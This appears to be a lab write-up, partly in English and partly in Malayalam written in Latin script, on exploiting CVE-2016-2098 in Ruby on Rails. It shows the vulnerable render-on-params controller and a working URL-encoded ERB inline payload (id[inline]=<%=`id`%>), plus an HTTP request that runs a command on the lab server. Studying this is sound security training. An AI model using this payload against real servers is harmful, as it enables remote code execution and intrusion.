## Introduction
-->This exercise covers a remote code execution vulnerability in Ruby-on-Rails when using render on user-supplied data
-->This course details the exploitation of the vulnerability CVE-2016-2098. This vulnerability is caused by calling the method `render` on user-supplied data. This issue can be used to gain code execution.

## The issue
-->This issue comes from the usage of the `render` method on user-supplied data. The following code illustrates the problem:
```ruby
class TestController < ApplicationController
	def show
	    render params[:id]
	end
end
```
-->The method `render` is usually used to render a page from a template like in the following code:
```ruby
class TestController < ApplicationController
	def show
		render 'show'
	end
end
```
-->The `render` method also allows developers to render plain text (`plaintext`) and even inline code (`inline`). If you want to jump to exploitation on your own, you can read more about the `render` method [here](http://guides.rubyonrails.org/layouts_and_rendering.html). Then you will need to look at ways to gain code execution using the first example.

## Exploitation
-->If you carefully read the [documentation](http://guides.rubyonrails.org/layouts_and_rendering.html), you can see that the `render` method accepts `inline` code. Instead of sending a simple parameter `id=test`, you can build your request to send a hash: `id[inline]=RUBYTEMPLATE`. To gain code execution, you just need to find the right value for `RUBYTEMPLATE` to exec commands. Here you will need to be extra careful with the encoding to get it to work.

## Conclusion
-->This exercise showed you how to exploit CVE-2016-2098 to gain code execution on a server. It's always important to make sure that you check for `Array` and `Hash` format in parameters when testing a web application as this may allow you to trigger unexpected behavior.

# Video explanation
-->lab open aakuka enit page il kanan patum oru link "This is a test page" enn so ath click chyuka
-->apol pages?id=test  enn pathilek pokum.page il just Test Page enn mathram kanan patum.so ini id=test ennathil so singleqoute idunu ie,=test' apol error varunu. single qoute alla enth ittalum ee same error thane varunu :
```http
Template is missing

Missing template welcome/testssldkfja, application/testssldkfja with {:locale=>[:en], :formats=>[:html], :handlers=>[:erb, :builder]}. Searched in: * "/myapp/myapp/app/views"
```
-->ivide id=test ennath page il entho render fn vech engand render chyunathan.so athan naaml exploit chyunath
-->so ee id=test ennath mati `id[inline]=<%25%3D%60id%60%25>` enn koduthal namuk code execution kitum.namuk already ariyam backtick ittale ruby il code execution nadakun enn
-->ee `id[inline]=<%25%3D%60id%60%25>`  ennal :
```
?id[inline]=<% `id` %>
```
ennan ok.
-->ini ee id mati namude UUID command ittal lab complete aayikolum.browser il vech chythit aakunila so repeater il vech chythu :
```http
GET /pages?id[inline]=%3C%25%3D%60/usr/local/bin/score+66d1486a-6571-4069-a67b-c4a70a99798d%60%25%3E HTTP/1.1
```
